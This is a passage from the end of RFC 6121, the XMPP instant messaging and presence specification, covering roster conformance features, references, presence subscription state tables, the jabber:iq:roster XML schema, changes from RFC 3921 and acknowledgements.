   Feature:  roster-set
   Description:  Treat an IQ stanza of type "set" containing a <query/>
      element qualified by the 'jabber:iq:roster' namespace as a request
      to add or update the item contained in the <query/> element.
   Section:  [Section 2.1.5](#section-2.1.5)
   Roles:  Client MUST, Server MUST.

   Feature:  roster-push
   Description:  Send a roster push to each interested resource whenever
      the server-side representation of the roster information
      materially changes, or handle such a push when received from the
      server.
   Section:  [Section 2.1.6](#section-2.1.6)
   Roles:  Client MUST, Server MUST.

   Feature:  roster-version
   Description:  Treat the 'ver' attribute of the <query/> element
      qualified by the 'jabber:iq:roster' namespace as an identifier of
      the particular version of roster information being sent or
      received.
   Section:  [Section 2.1.1](#section-2.1.1)
   Roles:  Client SHOULD, Server MUST.

Saint-Andre                  Standards Track                   [Page 98]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[13](#section-13).  References

[13.1](#section-13.1).  Normative References

   [DELAY]    Saint-Andre, P., "Delayed Delivery", XSF XEP 0203,
              September 2009.

   [KEYWORDS]
              Bradner, S., "Key words for use in RFCs to Indicate
              Requirement Levels", [BCP 14](/doc/html/bcp14), [RFC 2119](/doc/html/rfc2119), March 1997.

   [XML]      Maler, E., Yergeau, F., Sperberg-McQueen, C., Paoli, J.,
              and T. Bray, "Extensible Markup Language (XML) 1.0 (Fifth
              Edition)", World Wide Web Consortium
              Recommendation REC-xml-20081126, November 2008,
              <<http://www.w3.org/TR/2008/REC-xml-20081126>>.

   [XML-NAMES]
              Bray, T., Hollander, D., and A. Layman, "Namespaces in
              XML", W3C REC-xml-names, January 1999,
              <<http://www.w3.org/TR/REC-xml-names>>.

   [XMPP-CORE]
              Saint-Andre, P., "Extensible Messaging and Presence
              Protocol (XMPP): Core", [RFC 6120](/doc/html/rfc6120), March 2011.

[13.2](#section-13.2).  Informative References

   [CPIM]     Peterson, J., "Common Profile for Instant Messaging
              (CPIM)", [RFC 3860](/doc/html/rfc3860), August 2004.

   [CPP]      Peterson, J., "Common Profile for Presence (CPP)",
              [RFC 3859](/doc/html/rfc3859), August 2004.

   [DOS]      Handley, M., Rescorla, E., and IAB, "Internet Denial-of-
              Service Considerations", [RFC 4732](/doc/html/rfc4732), December 2006.

   [IMP-MODEL]
              Day, M., Rosenberg, J., and H. Sugano, "A Model for
              Presence and Instant Messaging", [RFC 2778](/doc/html/rfc2778), February 2000.

   [IMP-REQS]
              Day, M., Aggarwal, S., and J. Vincent, "Instant Messaging
              / Presence Protocol Requirements", [RFC 2779](/doc/html/rfc2779),
              February 2000.

   [IMP-SRV]  Peterson, J., "Address Resolution for Instant Messaging
              and Presence", [RFC 3861](/doc/html/rfc3861), August 2004.

Saint-Andre                  Standards Track                   [Page 99]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [INTEROP]  Masinter, L., "Formalizing IETF Interoperability
              Reporting", Work in Progress, October 2005.

   [IRC]      Kalt, C., "Internet Relay Chat: Architecture", [RFC 2810](/doc/html/rfc2810),
              April 2000.

   [IRI]      Duerst, M. and M. Suignard, "Internationalized Resource
              Identifiers (IRIs)", [RFC 3987](/doc/html/rfc3987), January 2005.

   [PROCESS]  Bradner, S., "The Internet Standards Process -- Revision
              3", [BCP 9](/doc/html/bcp9), [RFC 2026](/doc/html/rfc2026), October 1996.

   [REPORTS]  Dusseault, L. and R. Sparks, "Guidance on Interoperation
              and Implementation Reports for Advancement to Draft
              Standard", [BCP 9](/doc/html/bcp9), [RFC 5657](/doc/html/rfc5657), September 2009.

   [RFC3920]  Saint-Andre, P., Ed., "Extensible Messaging and Presence
              Protocol (XMPP): Core", [RFC 3920](/doc/html/rfc3920), October 2004.

   [RFC3921]  Saint-Andre, P., Ed., "Extensible Messaging and Presence
              Protocol (XMPP): Instant Messaging and Presence",
              [RFC 3921](/doc/html/rfc3921), October 2004.

   [SASL]     Melnikov, A. and K. Zeilenga, "Simple Authentication and
              Security Layer (SASL)", [RFC 4422](/doc/html/rfc4422), June 2006.

   [SIP-PRES]
              Rosenberg, J., "A Presence Event Package for the Session
              Initiation Protocol (SIP)", [RFC 3856](/doc/html/rfc3856), August 2004.

   [TLS]      Dierks, T. and E. Rescorla, "The Transport Layer Security
              (TLS) Protocol Version 1.2", [RFC 5246](/doc/html/rfc5246), August 2008.

   [TLS-CERTS]
              Saint-Andre, P. and J. Hodges, "Representation and
              Verification of Domain-Based Application Service Identity
              within Internet Public Key Infrastructure Using X.509
              (PKIX) Certificates in the Context of Transport Layer
              Security (TLS)", [RFC 6125](/doc/html/rfc6125), March 2011.

   [UNICODE]  The Unicode Consortium, "The Unicode Standard, Version
              6.0", 2010,
              <<http://www.unicode.org/versions/Unicode6.0.0/>>.

   [URI]      Berners-Lee, T., Fielding, R., and L. Masinter, "Uniform
              Resource Identifier (URI): Generic Syntax", STD 66,
              [RFC 3986](/doc/html/rfc3986), January 2005.

Saint-Andre                  Standards Track                  [Page 100]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [UUID]     Leach, P., Mealling, M., and R. Salz, "A Universally
              Unique IDentifier (UUID) URN Namespace", [RFC 4122](/doc/html/rfc4122),
              July 2005.

   [XEP-0016]
              Millard, P. and P. Saint-Andre, "Privacy Lists", XSF
              XEP 0016, February 2007.

   [XEP-0045]
              Saint-Andre, P., "Multi-User Chat", XSF XEP 0045,
              July 2008.

   [XEP-0054]
              Saint-Andre, P., "vcard-temp", XSF XEP 0054, July 2008.

   [XEP-0071]
              Saint-Andre, P., "XHTML-IM", XSF XEP 0071, September 2008.

   [XEP-0115]
              Hildebrand, J., Saint-Andre, P., and R. Troncon, "Entity
              Capabilities", XSF XEP 0115, February 2008.

   [XEP-0147]
              Saint-Andre, P., "XMPP URI Scheme Query Components", XSF
              XEP 0147, September 2006.

   [XEP-0160]
              Saint-Andre, P., "Best Practices for Handling Offline
              Messages", XSF XEP 0160, January 2006.

   [XEP-0163]
              Saint-Andre, P. and K. Smith, "Personal Eventing
              Protocol", XSF XEP 0163, July 2010.

   [XEP-0191]
              Saint-Andre, P., "Simple Communications Blocking", XSF
              XEP 0191, February 2007.

   [XEP-0201]
              Saint-Andre, P., Paterson, I., and K. Smith, "Best
              Practices for Message Threads", XSF XEP 0201,
              November 2010.

   [XEP-0237]
              Saint-Andre, P. and D. Cridland, "Roster Versioning", XSF
              XEP 0237, March 2010.

Saint-Andre                  Standards Track                  [Page 101]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [XML-DATATYPES]
              Biron, P. and A. Malhotra, "XML Schema Part 2: Datatypes
              Second Edition", W3C REC-xmlschema-2, October 2004,
              <<http://www.w3.org/TR/2004/REC-xmlschema-2-20041028/>>.

   [XML-SCHEMA]
              Thompson, H., Maloney, M., Mendelsohn, N., and D. Beech,
              "XML Schema Part 1: Structures Second Edition", World Wide
              Web Consortium Recommendation REC-xmlschema-1-20041028,
              October 2004,
              <<http://www.w3.org/TR/2004/REC-xmlschema-1-20041028>>.

   [XMPP-ADDR]
              Saint-Andre, P., "Extensible Messaging and Presence
              Protocol (XMPP): Address Format", [RFC 6122](/doc/html/rfc6122), March 2011.

   [XMPP-URI]
              Saint-Andre, P., "Internationalized Resource Identifiers
              (IRIs) and Uniform Resource Identifiers (URIs) for the
              Extensible Messaging and Presence Protocol (XMPP)",
              [RFC 5122](/doc/html/rfc5122), February 2008.

   [VCARD]    Dawson, F. and T. Howes, "vCard MIME Directory Profile",
              [RFC 2426](/doc/html/rfc2426), September 1998.

Saint-Andre                  Standards Track                  [Page 102]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[Appendix A](#appendix-A).  Subscription States

   This section provides detailed information about subscription states
   and server processing of subscription-related presence stanzas (i.e.,
   presence stanzas of type "subscribe", "subscribed", "unsubscribe",
   and "unsubscribed").

[A.1](#appendix-A.1).  Defined States

   There are four primary subscription states (these states are
   described from the perspective of the user, not the contact):

   None:  The user does not have a subscription to the contact's
      presence, and the contact does not have a subscription to the
      user's presence.

   To:  The user has a subscription to the contact's presence, but the
      contact does not have a subscription to the user's presence.

   From:  The contact has a subscription to the user's presence, but the
      user does not have a subscription to the contact's presence.

   Both:  Both the user and the contact have subscriptions to each
      other's presence (i.e., the union of 'from' and 'to').

      Implementation Note: For the purpose of processing subscription-
      related presence stanzas as described in the following sections, a
      subscription state of "None" includes the case of the contact not
      being in the user's roster at all, i.e., an unknown entity from
      the perspective of the user's roster.

   The foregoing states are supplemented by various sub-states related
   to pending inbound and outbound subscriptions, thus yielding nine
   possible subscription states:

   1.  "None" = Contact and user are not subscribed to each other, and
       neither has requested a subscription from the other; this is
       reflected in the user's roster by subscription='none'.

   2.  "None + Pending Out" = Contact and user are not subscribed to
       each other, and user has sent contact a subscription request but
       contact has not replied yet; this is reflected in the user's
       roster by subscription='none' and ask='subscribe'.

   3.  "None + Pending In" = Contact and user are not subscribed to each
       other, and contact has sent user a subscription request but user
       has not replied yet.  This state might or might not be reflected
       in the user's roster, as follows: if the user has created a

Saint-Andre                  Standards Track                  [Page 103]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

       roster item for the contact then the server MUST maintain that
       roster item and also note the existence of the inbound presence
       subscription request, whereas if the user has not created a
       roster item for the contact then the user's server MUST note the
       existence of the inbound presence subscription request but MUST
       NOT create a roster item for the contact (instead, the server
       MUST wait until the user has approved the subscription request
       before adding the contact to the user's roster).

   4.  "None + Pending Out+In" = Contact and user are not subscribed to
       each other, contact has sent user a subscription request but user
       has not replied yet, and user has sent contact a subscription
       request but contact has not replied yet; this is reflected in the
       user's roster by subscription='none' and ask='subscribe'.

   5.  "To" = User is subscribed to contact (one-way); this is reflected
       in the user's roster by subscription='to'.

   6.  "To + Pending In" = User is subscribed to contact, and contact
       has sent user a subscription request but user has not replied
       yet; this is reflected in the user's roster by subscription='to'.

   7.  "From" = Contact is subscribed to user (one-way); this is
       reflected in the user's roster by subscription='from'.

   8.  "From + Pending Out" = Contact is subscribed to user, and user
       has sent contact a subscription request but contact has not
       replied yet; this is reflected in the user's roster by
       subscription='from' and ask='subscribe'.

   9.  "Both" = User and contact are subscribed to each other (two-way);
       this is reflected in the user's roster by subscription='both'.

[A.2](#appendix-A.2).  Server Processing of Outbound Presence Subscription Stanzas

   Outbound presence subscription stanzas enable the user to manage his
   or her subscription to the contact's presence (via the "subscribe"
   and "unsubscribe" types), and to manage the contact's access to the
   user's presence (via the "subscribed" and "unsubscribed" types).

   The following rules apply to outbound routing of the stanza as well
   as changes to the user's roster.  (These rules are described from the
   perspective of the user, not the contact.  In addition, "S.N." stands
   for SHOULD NOT and "M.N." stands for MUST NOT.)

Saint-Andre                  Standards Track                  [Page 104]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[A.2.1](#appendix-A.2.1).  Subscribe

   Table 2: Processing of outbound "subscribe" stanzas

   +------------------------------------------------------------------+
   |  EXISTING STATE          |  ROUTE?   |  NEW STATE                |
   +------------------------------------------------------------------+
   |  "None"                  |  MUST [[1](#ref-1)] |  "None + Pending Out"     |
   |  "None + Pending Out"    |  MUST     |  no state change          |
   |  "None + Pending In"     |  MUST [[1](#ref-1)] |  "None + Pending Out+In"  |
   |  "None + Pending Out+In" |  MUST     |  no state change          |
   |  "To"                    |  MUST     |  no state change          |
   |  "To + Pending In"       |  MUST     |  no state change          |
   |  "From"                  |  MUST [[1](#ref-1)] |  "From + Pending Out"     |
   |  "From + Pending Out"    |  MUST     |  no state change          |
   |  "Both"                  |  MUST     |  no state change          |
   +------------------------------------------------------------------+

      [1] A state change to "pending out" includes setting the 'ask'
      flag to a value of "subscribe" in the user's roster.

[A.2.2](#appendix-A.2.2).  Unsubscribe

   Table 3: Processing of outbound "unsubscribe" stanzas

   +-----------------------------------------------------------------+
   |  EXISTING STATE          |  ROUTE?  |  NEW STATE                |
   +-----------------------------------------------------------------+
   |  "None"                  |  MUST    |  no state change          |
   |  "None + Pending Out"    |  MUST    |  "None"                   |
   |  "None + Pending In"     |  MUST    |  no state change          |
   |  "None + Pending Out+In" |  MUST    |  "None + Pending In"      |
   |  "To"                    |  MUST    |  "None"                   |
   |  "To + Pending In"       |  MUST    |  "None + Pending In"      |
   |  "From"                  |  MUST    |  no state change          |
   |  "From + Pending Out"    |  MUST    |  "From"                   |
   |  "Both"                  |  MUST    |  "From"                   |
   +-----------------------------------------------------------------+

Saint-Andre                  Standards Track                  [Page 105]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[A.2.3](#appendix-A.2.3).  Subscribed

   Table 4: Processing of outbound "subscribed" stanzas

   +-----------------------------------------------------------------+
   |  EXISTING STATE          |  ROUTE?  |  NEW STATE                |
   +-----------------------------------------------------------------+
   |  "None"                  |  M.N.    |  pre-approval [[1](#ref-1)]         |
   |  "None + Pending Out"    |  M.N.    |  pre-approval [[1](#ref-1)]         |
   |  "None + Pending In"     |  MUST    |  "From"                   |
   |  "None + Pending Out+In" |  MUST    |  "From + Pending Out"     |
   |  "To"                    |  M.N.    |  pre-approval [[1](#ref-1)]         |
   |  "To + Pending In"       |  MUST    |  "Both"                   |
   |  "From"                  |  M.N.    |  no state change          |
   |  "From + Pending Out"    |  M.N.    |  no state change          |
   |  "Both"                  |  M.N.    |  no state change          |
   +-----------------------------------------------------------------+

      [1] Detailed information regarding subscription pre-approval is
      provided under [Section 3.4](#section-3.4).

[A.2.4](#appendix-A.2.4).  Unsubscribed

   Table 5: Processing of outbound "unsubscribed" stanzas

   +-----------------------------------------------------------------+
   |  EXISTING STATE          |  ROUTE?  |  NEW STATE                |
   +-----------------------------------------------------------------+
   |  "None"                  |  S.N.    |  no state change [[1](#ref-1)]      |
   |  "None + Pending Out"    |  S.N.    |  no state change [[1](#ref-1)]      |
   |  "None + Pending In"     |  MUST    |  "None"                   |
   |  "None + Pending Out+In" |  MUST    |  "None + Pending Out"     |
   |  "To"                    |  S.N.    |  no state change [[1](#ref-1)]      |
   |  "To + Pending In"       |  MUST    |  "To"                     |
   |  "From"                  |  MUST    |  "None"                   |
   |  "From + Pending Out"    |  MUST    |  "None + Pending Out"     |
   |  "Both"                  |  MUST    |  "To"                     |
   +-----------------------------------------------------------------+

      [1] This event can result in cancellation of a subscription pre-
      approval, as described under [Section 3.4](#section-3.4).

[A.3](#appendix-A.3).  Server Processing of Inbound Presence Subscription Stanzas

   Inbound presence subscription stanzas request a subscription-related
   action from the user (via the "subscribe" type), inform the user of
   subscription-related actions taken by the contact (via the

Saint-Andre                  Standards Track                  [Page 106]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   "unsubscribe" type), or enable the user to manage the contact's
   access to the user's presence information (via the "subscribed" and
   "unsubscribed" types).

   The following rules apply to delivery of the inbound stanza as well
   as changes to the user's roster.  (These rules for server processing
   of inbound presence subscription stanzas are described from the
   perspective of the user, not the contact.  In addition, "S.N." stands
   for SHOULD NOT.)

[A.3.1](#appendix-A.3.1).  Subscribe

   Table 6: Processing of inbound "subscribe" stanzas

   +------------------------------------------------------------------+
   |  EXISTING STATE          |  DELIVER?  |  NEW STATE               |
   +------------------------------------------------------------------+
   |  "None"                  |  MUST [[1](#ref-1)]  |  "None + Pending In"     |
   |  "None + Pending Out"    |  MUST      |  "None + Pending Out+In" |
   |  "None + Pending In"     |  S.N.      |  no state change         |
   |  "None + Pending Out+In" |  S.N.      |  no state change         |
   |  "To"                    |  MUST      |  "To + Pending In"       |
   |  "To + Pending In"       |  S.N.      |  no state change         |
   |  "From"                  |  S.N. [[2](#ref-2)]  |  no state change         |
   |  "From + Pending Out"    |  S.N. [[2](#ref-2)]  |  no state change         |
   |  "Both"                  |  S.N. [[2](#ref-2)]  |  no state change         |
   +------------------------------------------------------------------+

      [1] If the user previously sent presence of type "subscribed" as
      described under [Appendix A.2.3](#appendix-A.2.3) and [Section 3.4](#section-3.4), then the server
      MAY auto-reply with "subscribed" and change the state to "From"
      rather than "None + Pending In".

      [2] Server SHOULD auto-reply with "subscribed".

[A.3.2](#appendix-A.3.2).  Unsubscribe

   When the user's server receives a presence stanza of type
   "unsubscribe" for the user from the contact, if the stanza results in
   a subscription state change from the user's perspective then the
   user's server MUST change the state, MUST deliver the presence stanza
   from the contact to the user, and SHOULD auto-reply by sending a
   presence stanza of type "unsubscribed" to the contact on behalf of
   the user.  Otherwise the user's server MUST NOT change the state and
   (because there is no state change) SHOULD NOT deliver the stanza.
   These rules are summarized in the following table.

Saint-Andre                  Standards Track                  [Page 107]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Table 7: Processing of inbound "unsubscribe" stanzas

   +------------------------------------------------------------------+
   |  EXISTING STATE          |  DELIVER?  |  NEW STATE               |
   +------------------------------------------------------------------+
   |  "None"                  |  S.N.      |  no state change         |
   |  "None + Pending Out"    |  S.N.      |  no state change         |
   |  "None + Pending In"     |  MUST [[1](#ref-1)]  |  "None"                  |
   |  "None + Pending Out+In" |  MUST [[1](#ref-1)]  |  "None + Pending Out"    |
   |  "To"                    |  S.N.      |  no state change         |
   |  "To + Pending In"       |  MUST [[1](#ref-1)]  |  "To"                    |
   |  "From"                  |  MUST [[1](#ref-1)]  |  "None"                  |
   |  "From + Pending Out"    |  MUST [[1](#ref-1)]  |  "None + Pending Out"    |
   |  "Both"                  |  MUST [[1](#ref-1)]  |  "To"                    |
   +------------------------------------------------------------------+

   [1] Server SHOULD auto-reply with "unsubscribed".

[A.3.3](#appendix-A.3.3).  Subscribed

   When the user's server receives a presence stanza of type
   "subscribed" for the user from the contact, if there is no pending
   outbound request for access to the contact's presence information,
   then it MUST NOT change the subscription state and (because there is
   no state change) SHOULD NOT deliver the stanza to the user.  If there
   is a pending outbound request for access to the contact's presence
   information and the inbound presence stanza of type "subscribed"
   results in a subscription state change, then the user's server MUST
   change the subscription state and MUST deliver the stanza to the
   user.  If the user already is subscribed to the contact's presence
   information, the inbound presence stanza of type "subscribed" does
   not result in a subscription state change; therefore the user's
   server MUST NOT change the subscription state and (because there is
   no state change) SHOULD NOT deliver the stanza to the user.  These
   rules are summarized in the following table.

Saint-Andre                  Standards Track                  [Page 108]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Table 8: Processing of inbound "subscribed" stanzas

   +------------------------------------------------------------------+
   |  EXISTING STATE          |  DELIVER?  |  NEW STATE               |
   +------------------------------------------------------------------+
   |  "None"                  |  S.N.      |  no state change         |
   |  "None + Pending Out"    |  MUST      |  "To"                    |
   |  "None + Pending In"     |  S.N.      |  no state change         |
   |  "None + Pending Out+In" |  MUST      |  "To + Pending In"       |
   |  "To"                    |  S.N.      |  no state change         |
   |  "To + Pending In"       |  S.N.      |  no state change         |
   |  "From"                  |  S.N.      |  no state change         |
   |  "From + Pending Out"    |  MUST      |  "Both"                  |
   |  "Both"                  |  S.N.      |  no state change         |
   +------------------------------------------------------------------+

[A.3.4](#appendix-A.3.4).  Unsubscribed

   When the user's server receives a presence stanza of type
   "unsubscribed" for the user from the contact, if there is a pending
   outbound request for access to the contact's presence information or
   if the user currently is subscribed to the contact's presence
   information, then the user's server MUST change the subscription
   state and MUST deliver the stanza to the user.  Otherwise, the user's
   server MUST NOT change the subscription state and (because there is
   no state change) SHOULD NOT deliver the stanza.  These rules are
   summarized in the following table.

   Table 9: Processing of inbound "unsubscribed" stanzas

   +------------------------------------------------------------------+
   |  EXISTING STATE          |  DELIVER?  |  NEW STATE               |
   +------------------------------------------------------------------+
   |  "None"                  |  S.N.      |  no state change         |
   |  "None + Pending Out"    |  MUST      |  "None"                  |
   |  "None + Pending In"     |  S.N.      |  no state change         |
   |  "None + Pending Out+In" |  MUST      |  "None + Pending In"     |
   |  "To"                    |  MUST      |  "None"                  |
   |  "To + Pending In"       |  MUST      |  "None + Pending In"     |
   |  "From"                  |  S.N.      |  no state change         |
   |  "From + Pending Out"    |  MUST      |  "From"                  |
   |  "Both"                  |  MUST      |  "From"                  |
   +------------------------------------------------------------------+

Saint-Andre                  Standards Track                  [Page 109]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[Appendix B](#appendix-B).  Blocking Communication

   Sections [2.3.5](#section-2.3.5) and [5.4.10](#section-5.4.10) of [[IMP-REQS](#ref-IMP-REQS)] require that a compliant
   instant messaging and presence technology needs to enable a user to
   block communications from selected users.  Protocols for doing so are
   specified in [[XEP-0016](#ref-XEP-0016)] and [[XEP-0191](#ref-XEP-0191)].

[Appendix C](#appendix-C).  vCards

   Sections [3.1.3](#section-3.1.3) and [4.1.4](#section-4.1.4) of [[IMP-REQS](#ref-IMP-REQS)] require that it be possible to
   retrieve out-of-band contact information for other users (e.g.,
   telephone number or email address).  An XML representation of the
   vCard specification defined in [RFC 2426](/doc/html/rfc2426) [[VCARD](#ref-VCARD "\"vCard MIME Directory Profile\"")] is in common use
   within the XMPP community to provide such information but is out of
   scope for this specification (documentation of this protocol is
   contained in [[XEP-0054](#ref-XEP-0054)]).

[Appendix D](#appendix-D).  XML Schema for jabber:iq:roster

   The following schema formally defines the 'jabber:iq:roster'
   namespace used in this document, in conformance with [[XML-SCHEMA](#ref-XML-SCHEMA)].
   Because validation of XML streams and stanzas is optional, this
   schema is not normative and is provided for descriptive purposes
   only.  For schemas defining core XMPP namespaces, refer to
   [[XMPP-CORE](#ref-XMPP-CORE)].

   <?xml version='1.0' encoding='UTF-8'?>

   <xs:schema
       xmlns:xs='http://www.w3.org/2001/XMLSchema'
       targetNamespace='jabber:iq:roster'
       xmlns='jabber:iq:roster'
       elementFormDefault='qualified'>

     <xs:element name='query'>
       <xs:complexType>
         <xs:sequence>
           <xs:element ref='item'
                       minOccurs='0'
                       maxOccurs='unbounded'/>
         </xs:sequence>
         <xs:attribute name='ver'
                       type='xs:string'
                       use='optional'/>
       </xs:complexType>
     </xs:element>

Saint-Andre                  Standards Track                  [Page 110]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

     <xs:element name='item'>
       <xs:complexType>
         <xs:sequence>
           <xs:element ref='group'
                       minOccurs='0'
                       maxOccurs='unbounded'/>
         </xs:sequence>
         <xs:attribute name='approved'
                       type='xs:boolean'
                       use='optional'/>
         <xs:attribute name='ask'
                       use='optional'>
           <xs:simpleType>
             <xs:restriction base='xs:NMTOKEN'>
               <xs:enumeration value='subscribe'/>
             </xs:restriction>
           </xs:simpleType>
         </xs:attribute>
         <xs:attribute name='jid'
                       type='xs:string'
                       use='required'/>
         <xs:attribute name='name'
                       type='xs:string'
                       use='optional'/>
         <xs:attribute name='subscription'
                       use='optional'
                       default='none'>
           <xs:simpleType>
             <xs:restriction base='xs:NMTOKEN'>
               <xs:enumeration value='both'/>
               <xs:enumeration value='from'/>
               <xs:enumeration value='none'/>
               <xs:enumeration value='remove'/>
               <xs:enumeration value='to'/>
             </xs:restriction>
           </xs:simpleType>
         </xs:attribute>
       </xs:complexType>
     </xs:element>

     <xs:element name='group' type='xs:string'/>

   </xs:schema>

Saint-Andre                  Standards Track                  [Page 111]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[Appendix E](#appendix-E).  Differences From [RFC 3921](/doc/html/rfc3921)

   Based on consensus derived from implementation and deployment
   experience as well as formal interoperability testing, the following
   substantive modifications were made from [[RFC3921](/doc/html/rfc3921 "\"Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence\"")] (in addition to
   numerous changes of an editorial nature).

   o  The protocol for session establishment was determined to be
      unnecessary and therefore the content previously defined in
      [Section 3 of RFC 3921](/doc/html/rfc3921#section-3) was removed.  However, for the sake of
      backward-compatibility server implementations are encouraged to
      advertise support for the feature, even though session
      establishment is a "no-op".

   o  In order to more seamlessly repair lack of synchronization in
      subscription states between rosters located at different servers,
      clarified and modified error handling related to presence
      subscription requests, presence probes and presence notifications.

   o  Changed the 'from' address for presence probes so that it is the
      bare JID, not the full JID.

   o  Adjusted and clarified stanza delivery rules based on
      implementation and deployment experience.

   o  Explicitly specified that a server is allowed to deliver a message
      stanza of type "normal" or "chat" to all resources if it has a
      method for allowing resources to opt in to such behavior.

   o  Allowed a server to use its own algorithm for determining the
      "most available" resource for the purpose of message delivery, but
      mentioned the recommended algorithm from [RFC 3921](/doc/html/rfc3921) (based on
      presence priority) as one possible algorithm.

   o  Added optional versioning of roster information to save bandwidth
      in cases where the roster has not changed (or has changed very
      little) between sessions; the relevant protocol interactions were
      originally described in [[XEP-0237](#ref-XEP-0237)].

   o  Added optional server support for pre-approved presence
      subscriptions via presence stanzas of type "subscribed", including
      a new 'approved' attribute that can be set to "true" (for a pre-
      approved subscription) or "false" (the default).

   o  Added optional 'parent' attribute to <thread/> element.

Saint-Andre                  Standards Track                  [Page 112]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   o  Moved the protocol for communications blocking (specified in
      [Section 10 of RFC 3921](/doc/html/rfc3921#section-10)) back to [[XEP-0016](#ref-XEP-0016)], from which it was
      originally taken.

   o  Recommended returning presence unavailable in response to probes.

   o  Clarified handling of presence probes sent to full JIDs.

   o  Explicitly specified that the default value for the presence
      <priority/> element is zero.

   o  Removed recommendation to support the "_im" and "_pres" SRV
      records.

[Appendix F](#appendix-F).  Acknowledgements

   This document is an update to, and derived from, [RFC 3921](/doc/html/rfc3921).  This
   document would have been impossible without the work of the
   contributors and commenters acknowledged there.

   Hundreds of people have provided implementation feedback, bug
   reports, requests for clarification, and suggestions for improvement
   since publication of [RFC 3921](/doc/html/rfc3921).  Although the document editor has
   endeavored to address all such feedback, he is solely responsible for
   any remaining errors and ambiguities.

   Some of the text about roster versioning was borrowed from
   [[XEP-0237](#ref-XEP-0237)], and some of the text about message threads was borrowed
   from [[XEP-0201](#ref-XEP-0201)].

   Special thanks are due to Kevin Smith, Matthew Wild, Dave Cridland,
   Waqas Hussain, Philipp Hancke, Florian Zeitz, Jonas Lindberg, Jehan
   Pages, Tory Patnoe, and others for their comments during Working
   Group Last Call.

   Thanks also to Richard Barnes for his review on behalf of the
   Security Directorate.

   The Working Group chairs were Ben Campbell and Joe Hildebrand.  The
   responsible Area Director was Gonzalo Camarillo.

Saint-Andre                  Standards Track                  [Page 113]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

Author's Address

   Peter Saint-Andre
   Cisco
   1899 Wyknoop Street, Suite 600
   Denver, CO  80202
   USA

   Phone: +1-303-308-3282
   EMail: psaintan@cisco.com

Saint-Andre                  Standards Track                  [Page 114]

```

[Datatracker](/doc/rfc6121/)

RFC 6121

RFC
- Proposed Standard

* Info
* Contents
* Prefs

| Document | Document type |  | RFC - Proposed Standard  March 2011  [View errata](https://www.rfc-editor.org/errata_search.php?rfc=6121 "Click to view errata.") [Report errata](https://www.rfc-editor.org/errata.php#reportnew "Click to report an error in the document.") Obsoletes [RFC 3921](/doc/html/rfc3921 "Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence") Was [draft-ietf-xmpp-3921bis](/doc/draft-ietf-xmpp-3921bis/20/) ([xmpp WG](/wg/xmpp/about/)) |
| --- | --- | --- | --- |
|  | Select version |  | * [20](/doc/html/draft-ietf-xmpp-3921bis-20) * [RFC 6121](/doc/html/rfc6121) |
|  | Compare versions |  | RFC 6121  draft-ietf-xmpp-3921bis-20  draft-ietf-xmpp-3921bis-19  draft-ietf-xmpp-3921bis-18  draft-ietf-xmpp-3921bis-17  draft-ietf-xmpp-3921bis-16  draft-ietf-xmpp-3921bis-15  draft-ietf-xmpp-3921bis-14  draft-ietf-xmpp-3921bis-13  draft-ietf-xmpp-3921bis-12  draft-ietf-xmpp-3921bis-11  draft-ietf-xmpp-3921bis-10  draft-ietf-xmpp-3921bis-09  draft-ietf-xmpp-3921bis-08  draft-ietf-xmpp-3921bis-07  draft-ietf-xmpp-3921bis-06  draft-ietf-xmpp-3921bis-05  draft-ietf-xmpp-3921bis-04  draft-ietf-xmpp-3921bis-03  draft-ietf-xmpp-3921bis-02  draft-ietf-xmpp-3921bis-01  draft-ietf-xmpp-3921bis-00   RFC 6121  draft-ietf-xmpp-3921bis-20  draft-ietf-xmpp-3921bis-19  draft-ietf-xmpp-3921bis-18  draft-ietf-xmpp-3921bis-17  draft-ietf-xmpp-3921bis-16  draft-ietf-xmpp-3921bis-15  draft-ietf-xmpp-3921bis-14  draft-ietf-xmpp-3921bis-13  draft-ietf-xmpp-3921bis-12  draft-ietf-xmpp-3921bis-11  draft-ietf-xmpp-3921bis-10  draft-ietf-xmpp-3921bis-09  draft-ietf-xmpp-3921bis-08  draft-ietf-xmpp-3921bis-07  draft-ietf-xmpp-3921bis-06  draft-ietf-xmpp-3921bis-05  draft-ietf-xmpp-3921bis-04  draft-ietf-xmpp-3921bis-03  draft-ietf-xmpp-3921bis-02  draft-ietf-xmpp-3921bis-01  draft-ietf-xmpp-3921bis-00   Side-by-side  Inline |
|  | Author |  | [Peter Saint-Andre](/person/stpeter%40stpeter.im "Datatracker profile of Peter Saint-Andre")   Email authors |
|  | RFC stream |  | IETF Logo IETF Logo |
|  | Other formats |  | [txt](https://www.rfc-editor.org/rfc/rfc6121.txt) [html](https://www.rfc-editor.org/rfc/rfc6121.html) [pdf](https://www.rfc-editor.org/rfc/pdfrfc/rfc6121.txt.pdf) [bibtex](/doc/rfc6121/bibtex/) |
|  | Additional resources |  | [Mailing list discussion](https://mailarchive.ietf.org/arch/browse/xmpp/?q=rfc6121 OR %22draft-ietf-xmpp-3921bis%22) |

[Report a datatracker bug](https://github.com/ietf-tools/datatracker/issues/new/choose)

Show sidebar by default

Yes

No

Tab to show by default

Info

Contents

HTMLization configuration

HTMLize the plaintext

Plaintextify the HTML
